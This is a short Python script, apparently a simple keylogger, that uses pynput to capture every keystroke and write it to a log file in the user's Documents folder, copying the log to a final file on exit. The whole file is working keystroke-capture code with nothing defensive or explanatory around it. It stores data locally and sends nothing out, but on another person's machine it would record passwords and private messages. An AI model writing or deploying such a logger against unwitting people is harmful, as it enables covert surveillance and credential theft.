from pynput import keyboard
import atexit
import shutil
import os

# Get path to the user's Documents folder
documents_path = os.path.join(os.path.expanduser("~"), "Documents")

# Define file paths
temp_log = os.path.join(documents_path, "keylog_temp.txt")
final_log = os.path.join(documents_path, "keylog1.txt")

def on_press(key):
    try:
        with open(temp_log, "a") as f:
            f.write(f'{key.char}')
    except AttributeError:
        with open(temp_log, "a") as f:
            f.write(f' [{key}] ')

# Save temp log to final log on exit
def save_on_exit():
    if os.path.exists(temp_log):
        shutil.copy(temp_log, final_log)
        print(f"✅ Keystrokes saved to: {final_log}")

def main():
    atexit.register(save_on_exit)
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
